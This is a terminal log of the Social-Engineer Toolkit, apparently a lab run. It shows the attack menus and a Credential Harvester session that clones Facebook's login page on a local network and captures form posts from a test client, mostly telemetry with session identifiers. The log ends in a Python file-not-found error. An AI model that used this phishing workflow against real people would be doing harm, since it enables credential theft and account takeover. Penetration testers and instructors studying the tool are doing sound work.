
            :::===  :::===== :::====
            :::     :::      :::====
             =====  ======     ===
                === ===        ===
            ======  ========   ===


[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 2

The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.

The Java Applet Attack method will spoof a Java Certificate and deliver a Metasploit-based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.

The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.

The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.

The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.

The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if it's too slow/fast.

The Multi-Attack method will add a combination of attacks through the web attack menu. For example, you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.

The HTA Attack method will allow you to clone a site and perform PowerShell injection through HTA files which can be used for Windows-based PowerShell exploitation through the browser.

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu

set:webattack>3

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.
   
   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack>2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

-------------------------------------------------------------------------------
--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---

The way that this works is by cloning a site and looking for form fields to
rewrite. If the POST fields are not usual methods for posting forms this 
could fail. If it does, you can always save the HTML, rewrite the forms to
be standard forms and use the "IMPORT" feature. Additionally, really 
important:

If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
IP address below, not your NAT address. Additionally, if you don't know
basic networking concepts, and you have a private IP address, you will
need to do port forwarding to your NAT IP address from your external IP
address. A browser doesn’t know how to communicate with a private IP
address, so if you don't specify an external IP address if you are using
this from an external perspective, it will not work. This isn't a SET issue
this is how networking works.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.14]: ifconfig
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: httphttp://www.facebook.com^[[D^[[D^[[   ttphttp://www.facebook.com^[[D^[[D^[[                                        

[*] Cloning the website: https://login.facebook.com/login.php                
[*] This could take a little bit...                                          

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                  
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                               
[*] Information will be displayed to you as it arrives below:                
192.168.1.5 - - [19/Jan/2025 19:42:34] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundarypkNgB8V1YWuWPlau      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1737333755506                                                                
------WebKitFormBoundarypkNgB8V1YWuWPlau                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"user":"0","webSessionId":"ovkhzw:8w3ptf:b0wm93","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"97ef8a51-9623-49fa-a700-db1bf6671c8d\",\"ct\":1659080345,\"sjd\":\"okKgfmYUEqDWglLsPl+E8WOgq3sIYx+nVbMDvbI2DLm3wsQPtBoq28Xj0P3LrNxWle/v7ePYqleBjPkuSekQWXvjeAvidgNtUh6iize6BQ+9LOnLx8tnxwHgE9NK/QK2HbqT2HGIav5F5L0s0pJqcA==\",\"sid\":-1}","r":1,"d":"$^|AcYgMWSw-Gs0RN-k0B18IB5G1ObhUBJ0djDsw1Hwxk8ws1UvLfYToXbPuO8GdaC7aCOwFeboJ7FXhsOP3EzlYYnILlOK|fd.AcbpzMAS0ybCUzuO3_zjflbSxVMlIgOs2khuRtuN6faJPzGIzcJhjQ7SHmHr0qdi87qlGnvGFV8H4yQkyqKecj8e","s":"ovkhzw:8w3ptf:b0wm93","t":1737333649685.7,"b":[1,128]},1737333755505.6,0,512]],"trigger":"falco:bd_pdc_signals"}]              
------WebKitFormBoundarypkNgB8V1YWuWPlau--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundary30vSnt3ApXmiqOHt      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1737333756521                                                                
------WebKitFormBoundary30vSnt3ApXmiqOHt                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":[["falco:web_blue_time_spent_navigation",{"e":"{\"json_data\":\"{\\\"source_path\\\":null,\\\"source_token\\\":null,\\\"dest_path\\\":\\\"XWebLoginController\\\",\\\"dest_token\\\":\\\"96e88af3\\\",\\\"impression_id\\\":\\\"1i6jfINXD3Vlbuhxz\\\",\\\"cause\\\":\\\"load\\\",\\\"sid_raw\\\":\\\"ovkhzw:8w3ptf:b0wm93\\\",\\\"referrer\\\":\\\"\\\",\\\"dest_ef_page\\\":null,\\\"dest_uri\\\":\\\"https://www.facebook.com/login.php\\\"}\"}","r":1,"d":"$^|AcYgMWSw-Gs0RN-k0B18IB5G1ObhUBJ0djDsw1Hwxk8ws1UvLfYToXbPuO8GdaC7aCOwFeboJ7FXhsOP3EzlYYnILlOK|fd.AcbpzMAS0ybCUzuO3_zjflbSxVMlIgOs2khuRtuN6faJPzGIzcJhjQ7SHmHr0qdi87qlGnvGFV8H4yQkyqKecj8e","s":"ovkhzw:8w3ptf:b0wm93","t":1737333649703.7,"b":[1,128]},1737333755515.1,0,653],["falco:web_perf_device_info_log",{"e":"{\"cpu_cores\":8,\"ram\":null,\"gpu_renderer\":\"ANGLE (AMD, AMD Radeon(TM) Vega 8 Graphics (0x000015D8) Direct3D11 vs_5_0 ps_5_0, D3D11)\",\"gpu_vendor\":\"Google Inc. (AMD)\"}","r":1,"d":"$^|AcYgMWSw-Gs0RN-k0B18IB5G1ObhUBJ0djDsw1Hwxk8ws1UvLfYToXbPuO8GdaC7aCOwFeboJ7FXhsOP3EzlYYnILlOK|fd.AcbpzMAS0ybCUzuO3_zjflbSxVMlIgOs2khuRtuN6faJPzGIzcJhjQ7SHmHr0qdi87qlGnvGFV8H4yQkyqKecj8e","s":"ovkhzw:8w3ptf:b0wm93","t":1737333649757.5,"b":[1,128]},1737333755568.9001,0,444],["falco:bd_pdc_signals",{"e":"{\"asid\":\"97ef8a51-9623-49fa-a700-db1bf6671c8d\",\"ct\":1659080345,\"sjd\":\"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\",\"sid\":-1}","r":1,"d":"$^|AcYgMWSw-Gs0RN-k0B18IB5G1ObhUBJ0djDsw1Hwxk8ws1UvLfYToXbPuO8GdaC7aCOwFeboJ7FXhsOP3EzlYYnILlOK|fd.AcbpzMAS0ybCUzuO3_zjflbSxVMlIgOs2khuRtuN6faJPzGIzcJhjQ7SHmHr0qdi87qlGnvGFV8H4yQkyqKecj8e","s":"ovkhzw:8w3ptf:b0wm93","t":1737333649765.8,"b":[1,128]},1737333755577.2002,0,2400]],"user":"0","webSessionId":"ovkhzw:8w3ptf:b0wm93","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":""}]   
------WebKitFormBoundary30vSnt3ApXmiqOHt--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryI7FdAbSE9fE5iiJ7      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1737333764520                                                                
------WebKitFormBoundaryI7FdAbSE9fE5iiJ7                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"5g2AW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF0hiaXRzLmpzX2luaXRpYWxpemVkCSQcblwiOjEsXCIBDzRudWxsfX19LFwiNzE3MwkgMGVudGl0aWVzLmZmX2oFlnwuYmRfcGRjX3NpZ25hbHMuMjU2MjgxMDQwNTU4LjAuQxE5AHYBjwxsb2dnLmsAADIuawAILFwiCSZgaW5mby51cGxvYWRfbWV0aG9kLmJhbnphaQFAIF9jcml0aWNhbAmRQrEANkYASjgAEVokcHJvY2Vzc2luZ35KAAmLmrgAGXINOIZpAAW0RlkBJfMMbHVlXzm5KF9uYXZpZ2F0aW9utmkBMtQBNiMBCd5KaQEwaW1tZWRpYXRlbHlcIkFlpmwBHTsRYO5vATK+AAW/Vi4BLHBlcmZfZGV2aWNlX0FFDF9sb2f+KAE1KMrZATVpKWQuQgI20wD0IAF9fX0iLCJyIjoxLCJkIjoiJF58QWNZZ01XU3ctR3MwUk4tazBCMThJQjVHMU9iaFVCSjBkakRzdzFId3hrOHdzMVV2TGZZVG9YYlB1TzhHZGFDN2FDT3dGZWJvSjdGWGhzT1AzRXpsWVluSUxsT0t8ZmQuQWNicHpNQVMweWJDVXp1TzNfempmbGJTeFZNbElnT3Mya2h1UnR1TjZmYUpQekdJemNKaGpRN1NIbUhyMHFkaTg3cWxHbnZHRlY4SDR5UWt5cUtlY2o4ZSIsInMiOiJvdmtoenc6OHczcHRmOmIwd205MyIsInQiOjE3MzczMzM2NTQ2ODcuMSwiYiI6WzEsMTI4XX0sMTczNzMzMzc2MDQ5OC4zLDAsMTI0M10ssQsMd2ViX30PIGJpdF9hcnJheb0WFHNpZF9yYYH0AFxShgAkXCIsXCJzdGFydAVKgfEJkiA3NTUsXCJ0b3MJUyBcIjpbMzEsMF0NFRRjdW1cIjoRIxxpZFwiOlwiYgXZAFwBUwE5BGxlYSQAOQ0yGHNlcVwiOjD+2wH+2wH+2wHK2wEMNzcwN2LbATQzNTE4LjUsMCw0MTZdXQ==","user":"0","webSessionId":"ovkhzw:8w3ptf:b0wm93","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                                                                           
------WebKitFormBoundaryI7FdAbSE9fE5iiJ7--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=3                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=4                                                               
PARAM: __hs=20108.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019440651                                                      
PARAM: __s=ovkhzw:8w3ptf:b0wm93                                              
PARAM: __hsi=7461791205198544391                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVr2LVsb61w                                                       
PARAM: jazoest=2912                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019440651                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1737333649                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryopBD31N6iRCzWZMH      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1737333786325                                                                
------WebKitFormBoundaryopBD31N6iRCzWZMH                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"user":"0","webSessionId":"ovkhzw:8w3ptf:b0wm93","app_id":"256281040558","posts":[["falco:bd_pdc_signals",{"e":"{\"asid\":\"97ef8a51-9623-49fa-a700-db1bf6671c8d\",\"ct\":1659080345,\"sjd\":\"okKgfmYUEqDWglLsPl+E8ai3hvGLB4HX1FKagx58KB6kyKiwE6Q+evfTSe5AA4fNCYUSj/ge4hWkp+/kQJsQIS1u/3SCvqRUybQ0VFz2/FzqcR0g+yMoctSPOgiEZUlv04oKUHFQRiwjgsmg/dUBOQ==\",\"sid\":-1}","r":1,"d":"$^|AcYgMWSw-Gs0RN-k0B18IB5G1ObhUBJ0djDsw1Hwxk8ws1UvLfYToXbPuO8GdaC7aCOwFeboJ7FXhsOP3EzlYYnILlOK|fd.AcbpzMAS0ybCUzuO3_zjflbSxVMlIgOs2khuRtuN6faJPzGIzcJhjQ7SHmHr0qdi87qlGnvGFV8H4yQkyqKecj8e","s":"ovkhzw:8w3ptf:b0wm93","t":1737333680513.4,"b":[1,128]},1737333786325,0,512]],"trigger":"falco:bd_pdc_signals"}]                
------WebKitFormBoundaryopBD31N6iRCzWZMH--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryl6ZQEAG8whO0jxZB      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1737333821289                                                                
------WebKitFormBoundaryl6ZQEAG8whO0jxZB                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":"5QmAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiNzE3MwkKMGVudGl0aWVzLmZmX2oFOAAuATyQdGltZV9zcGVudF9iaXRfYXJyYXkuMjU2MjgxMDQwNTU4LjAuQxFDLHZlbnQubG9nZ2VkXAVfHG5cIjoxLFwiAQ8cbnVsbH0sXCIJJmBpbmZvLnVwbG9hZF9tZXRob2QuYmFuemFpAUAsX2ltbWVkaWF0ZWx5kkkAVjsAEWAkcHJvY2Vzc2luZ35NAAmRYr4AAQH0HAEiLCJyIjoxLCJkIjoiJF58QWNZZ01XU3ctR3MwUk4tazBCMThJQjVHMU9iaFVCSjBkakRzdzFId3hrOHdzMVV2TGZZVG9YYlB1TzhHZGFDN2FDT3dGZWJvSjdGWGhzT1AzRXpsWVluSUxsT0t8ZmQuQWNicHpNQVMweWJDVXp1TzNfempmbGJTeFZNbElnT3Mya2h1UnR1TjZmYUpQekdJemNKaGpRN1NIbUhyMHFkaTg3cWxHbnZHRlY4SDR5UWt5cUtlY2o4ZSIsInMiOiJvdmtoenc6OHczcHRmOmIwd205MyIsInQiOjE3MzczMzM2NjM1MDMuNCwiYiI6WzEsMTI4XX0sMTczNzMzMzc2OTMxNC44LDAsNTg3XSz+egJRejRiZF9wZGNfc2lnbmFsc/5wAoZwAhxjcml0aWNhbH4gAgBpQbZdbRE4AC5JOf5qAv5qAv5qAv5qAvpqAhw4NjUwMy4yLFJqAjg5MjMxNC42LDAsNTcxXV0=","user":"0","webSessionId":"ovkhzw:8w3ptf:b0wm93","send_method":"beacon","compression":"snappy_base64","snappy_ms":1}]                                               
------WebKitFormBoundaryl6ZQEAG8whO0jxZB--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                             
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: session_storage[sp_pi]=216                                            
PARAM: session_storage[TabId]=6                                              
PARAM: logtime=1                                                             
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                 
PARAM: __req=7                                                               
PARAM: __hs=20108.BP:DEFAULT.2.0.0.0.0                                       
PARAM: dpr=2                                                                 
PARAM: __ccg=EXCELLENT                                                       
PARAM: __rev=1019440651                                                      
PARAM: __s=svx8pn:8w3ptf:b0wm93                                              
PARAM: __hsi=7461791205198544391                                             
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE3nwaq0yE7i0n24o5-0me1Fw5uw5Uwdq0Ho2eU5O08HwSyE1582ZwrU1Xo1UU3jwea                        
PARAM: __csr=                                                                
PARAM: lsd=AVr2LVsb61w                                                       
PARAM: jazoest=2912                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1019440651                           
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1737333649                           
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryw2BZAiXTyVhi4xQ8      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1737333887996                                                                
------WebKitFormBoundaryw2BZAiXTyVhi4xQ8                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"svx8pn:8w3ptf:b0wm93\",\"start_time\":1737333821,\"tos_array\":[7728507,49152],\"tos_cum\":24,\"tos_id\":\"b0wm93\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|AcYgMWSw-Gs0RN-k0B18IB5G1ObhUBJ0djDsw1Hwxk8ws1UvLfYToXbPuO8GdaC7aCOwFeboJ7FXhsOP3EzlYYnILlOK|fd.AcbpzMAS0ybCUzuO3_zjflbSxVMlIgOs2khuRtuN6faJPzGIzcJhjQ7SHmHr0qdi87qlGnvGFV8H4yQkyqKecj8e","s":"svx8pn:8w3ptf:b0wm93","t":1737333779503.4,"b":[1,128]},1737333885314.9001,0,427]],"user":"0","webSessionId":"svx8pn:8w3ptf:b0wm93","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":""}]                                      
------WebKitFormBoundaryw2BZAiXTyVhi4xQ8--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: ------WebKitFormBoundaryRN9KDuTCGce5QjtG      
Content-Disposition: form-data; name="ts"                                    
                                                                             
1737333894679                                                                
------WebKitFormBoundaryRN9KDuTCGce5QjtG                                     
Content-Disposition: form-data; name="q"                                     
                                                                             
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":{\"n\":1,\"d\":null},\"event.info.upload_method.banzai.log_immediately\":{\"n\":1,\"d\":null},\"event.info.banzai.log_immediately.upload_processing\":{\"n\":1,\"d\":null},\"event.uploaded\":{\"n\":1,\"d\":null}}}}}","r":1,"d":"$^|AcYgMWSw-Gs0RN-k0B18IB5G1ObhUBJ0djDsw1Hwxk8ws1UvLfYToXbPuO8GdaC7aCOwFeboJ7FXhsOP3EzlYYnILlOK|fd.AcbpzMAS0ybCUzuO3_zjflbSxVMlIgOs2khuRtuN6faJPzGIzcJhjQ7SHmHr0qdi87qlGnvGFV8H4yQkyqKecj8e","s":"svx8pn:8w3ptf:b0wm93","t":1737333784504.7,"b":[1,128]},1737333890316.1,0,587]],"user":"0","webSessionId":"svx8pn:8w3ptf:b0wm93","send_method":"beacon","compression":""}]          
------WebKitFormBoundaryRN9KDuTCGce5QjtG--                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
----------------------------------------
Exception occurred during processing of request from ('192.168.1.5', 63536)
Traceback (most recent call last):
  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.12/socketserver.py", line 362, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
    self.handle()
  File "/usr/lib/python3.12/http/server.py", line 436, in handle
    self.handle_one_request()
  File "/usr/lib/python3.12/http/server.py", line 424, in handle_one_request
    method()
  File "/usr/share/set/src/webattack/harvester/harvester.py", line 313, in do_POST
    filewrite3 = open("%s/src/logs/harvester.log" % os.getcwd(), "w")
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/root/.set/web_clone/src/logs/harvester.log'
